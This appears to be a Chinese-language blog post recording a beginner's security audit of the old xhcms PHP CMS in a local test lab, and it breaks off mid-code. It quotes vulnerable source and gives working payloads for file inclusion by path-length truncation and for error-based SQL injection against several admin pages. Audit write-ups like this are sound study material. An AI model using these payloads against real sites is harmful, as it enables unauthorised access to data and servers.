第一次审计，抱着学习的态度，从一个初学者的角度去尝试摸石头过河，踩坑，跳坑，并做个记录吧：
[toc]
## 一、环境安装
使用phpstudy 5.4.45+mysql5.5.53进行搭建（这个cms比较老，用php7会出问题）。
去网上下载xhcms源码（
**（安装时记得提前在phpstudy中mysql管理创建一个数据库（我这里创建一个testxhcms数据库使用））**
## 审计过程
#### 先了解一下目录结构
    admin         --管理后台文件夹
    css           --存放css的文件夹
    files         --存放页面的文件夹
    images        --存放图片的文件夹
    inc           --存放网站配置文件的文件夹
    install       --网站进行安装的文件夹
    seacmseditor  --编辑器文件夹
    template      --模板文件夹
    upload        --上传功能文件夹
    index.php     --网站首页
一个个看文件不太现实，用一用工具吧，先使用seay自动化代码审计工具扫一下：
可以看到，有爆出34个可疑位置，接下来就一个个去分析代码，进行尝试。
#### 一、第一条检测结果 首页/后台文件包含漏洞
index.php以及admin/index.php
分析代码：
第一行的注释里面有写"单一入口模式"，这个是什么意思呢？简单来说就是用 **一个文件处理所有的HTTP请求**
，例如不管是内容列表页，用户登录页还是内容详细页，都是通过从浏览器访问 index.php 文件来进行处理的，这里这个 index.php
文件就是这个应用程序的单一入口（ **具体造成的影响在我们后面使用文件时会再次提到来进行理解** ）。
第二行的error_reporting(0);表示关闭所有PHP错误报告。
addslashes() 函数返回在预定义字符(单·双引号、反斜杠（\）、NULL)之前添加反斜杠的字符串。
第四行、第五行，通过三元运算符判断文件名是否为空，为空则载入files/index.php文件，反之赋值就会把传递进来的文件名赋值给$action，".“在PHP里是拼接的作用，因此就是把第四行传递的变量$file（到这里是$action,因为上一行$file赋值给了$action）也就是传递的文件名字，拼接前面的目录”files/”以及后面的”.php"这个后缀，最终载入拼接后的相应文件。
那么这里漏洞利用其实就两个问题：跳出限定的目录和截断拼接的后缀
我们需要截断后面的 .php 后缀，因此使用Windows文件名字的特性及Windows文件名的全路径限制进行截断。1.
**Windows下在文件名字后面加 “.” 不影响文件。**
2. **Windows的文件名的全路径（Fully Qualified File Name）的最大长度为260字节** 。但是这个是有利用条件的，在我这几次测试过程中， 发现必须同时满足 **_php版本=5.2.17、Virtual Directory Support=enable_**
先在网站根目录下写一个phpinfo用于测试： **test.txt**
    00截断利用条件 //此处由于addslashes()函数导致不可用
    1、magic_quotes_gpc =off
    2、php版本小于5.3.4
    ？截断失败
    长度截断可用：
    //php版本=5.2.17、Virtual Directory Support=enable
    payload：
    1.?r=../test.txt
    2.?r=../test.txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
#### 二、sql注入
##### /admin/files/login.php
    require '../inc/conn.php';
    $login=$_POST['login'];
    $user=$_POST['user'];
    $password=$_POST['password'];
    $checkbox=$_POST['checkbox'];
    if ($login<>""){
    $query = "SELECT * FROM manage WHERE user='$user'";
    $result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    $users = mysql_fetch_array($result);
对$user变量未作过滤，直接单引号包裹带入查询，存在sql注入，打一打（测试未屏蔽报错，用报错注入）：
payload：
    1' and (extractvalue(1,concat(0x7e,(select database()),0x7e)))--
成功爆出数据库
##### /admin/files/adset.php报警SQL注入漏洞：
分析代码，报警处三个可控变量ad1-ad3都经过了addlashes()函数处理，因此此处其实不存在sql注入漏洞，属于误报。
下一个
##### /admin/files/editcolumn.php
双击打开文件，首先看到的还不是报错位置，而是文件开头，直接吸引了我的目光，关键代码：
    $id=$_GET['id'];
    $type=$_GET['type'];
    if ($type==1){
    $query = "SELECT * FROM nav WHERE id='$id'";
    $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    $nav = mysql_fetch_array($resul);
    }
    if ($type==2){
    $query = "SELECT * FROM navclass WHERE id='$id'";
    $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    $nav = mysql_fetch_array($resul);
    }
可以看到，id、type都是直接通过GET方式传入进来，然后单引号闭合，未作任何其他过滤就开始进入数据库查询。因此我们先登陆进后台,然后去包含这个文件（
**前面我们提到index.php文件中的单一入口模式，这也就导致这个文件夹下的所有文件都需要这么去使用** ）否则由于权限问题会产生报错如下：
进入此页面进行利用尝试：
    http://192.168.121.130/xhcms/admin/?r=editcolumn
由上分析，直接GET传参尝试利用：（要进入连接数据库部分，因此type需要满足条件1或2，这里随便选择1）没有屏蔽报错，所以懒得测试字段什么的，直接采用报错注入，payload：
    ?r=editcolumn&type=1&id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
成功注出数据库，后面就不写了，流程一套就是。
言归正传，报警处代码：
    $save=$_POST['save'];
    $name=$_POST['name'];
    $keywords=$_POST['keywords'];
    $description=$_POST['description'];
    $px=$_POST['px'];
    $xs=$_POST['xs'];
    if ($xs==""){
    $xs=1;  
    }
    $tuijian=$_POST['tuijian'];
    if ($tuijian==""){
    $$tuijian=0;    
    }
    $content=$_POST['content'];
    if ($save==1){
    if ($name==""){
    echo "";
    exit;
    }
    if ($type==1){
    $query = "UPDATE nav SET 
    name='$name',
    keywords='$keywords',
    description='$description',
    xs='$xs',
    px='$px',
    content='$content',
    date=now()
    WHERE id='$id'";
    @mysql_query($query) or die('修改错误：'.mysql_error());
    echo ""; 
    exit;
    }
    if ($type==2){
    $query = "UPDATE navclass SET 
    name='$name',
    keywords='$keywords',
    description='$description',
    xs='$xs',
    px='$px',
    tuijian='$tuijian',
    date=now()
    WHERE id='$id'";
    @mysql_query($query) or die('修改错误：'.mysql_error());
    echo ""; 
    exit;
    }
其实就是在刚刚代码下面，漏洞出现方式和它一摸一样（除了此处是POST传参），因此不再详谈。
下一个
##### **/admin/files/editlink.php**
关键代码：
    <?php
    require '../inc/checklogin.php';
    require '../inc/conn.php';
    $linklistopen='class="open"';
    $id=$_GET['id'];
    $query = "SELECT * FROM link WHERE id='$id'";
    $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());//Id不做过滤，直接传入查询
    $link = mysql_fetch_array($resul);
    $query = "UPDATE link SET 
    name='$name',
    url='$url',
    mail='$mail',
    jieshao='$jieshao',
    xs='$xs',
    date=now()
    WHERE id='$id'";
    @mysql_query($query) or die('修改错误：'.mysql_error());
    echo ""; 
    exit;
    //name等参数不做过滤，直接传入查询更新
同样的漏洞出现方式，对可控变量不做过滤，直接单引号闭合开始查询更新数据。利用payload：
    ?r=editlink&id=1' and (extractvalue(1,concat(0x7e,(select database()),0x7e)))--+
或者POST注入(直接填在框内，点击保存)
    name=1&url=1' and (extractvalue(1,concat(0x7e,(select database()),0x7e))) and'
下一个
##### /admin/files/editsoft.php
    $id=$_GET['id'];
    $query = "SELECT * FROM download WHERE id='$id'";
    $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());//典中点，不再提
    $download = mysql_fetch_array($resul);
    $save=$_POST['save'];
    $title=$_POST['title'];
    $author=$_POST['author'];
    $keywords=$_POST['keywords'];
    $description=$_POST['description'];
    $images=$_POST['images'];
    $daxiao=$_POST['daxiao'];
    $language=$_POST['language'];
    $version=$_POST['version'];
    $demo=$_POST['demo'];
    $url=$_POST['url'];
    $softadd=$_POST['softadd'];
    $softadd2=$_POST['softadd2'];
    $content=$_POST['content'];
    $xs=$_POST['xs'];
    if ($xs==""){ $xs=1;}
    if ($save==1){
    //处理图片上传
    if(!empty($_FILES['images']['tmp_name'])){
    $query = "SELECT * FROM imageset";
    $result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    $imageset = mysql_fetch_array($result);
    $query = "UPDATE download SET 
    title='$title',
    keywords='$keywords',
    description='$description',
    $images
    daxiao='$daxiao',
    language='$language',
    version='$version',
    author='$author',
    demo='$demo',
    url='$url',
    softadd='$softadd',
    softadd2='$softadd2',
    xs='$xs',
    content='$content',
    date=now()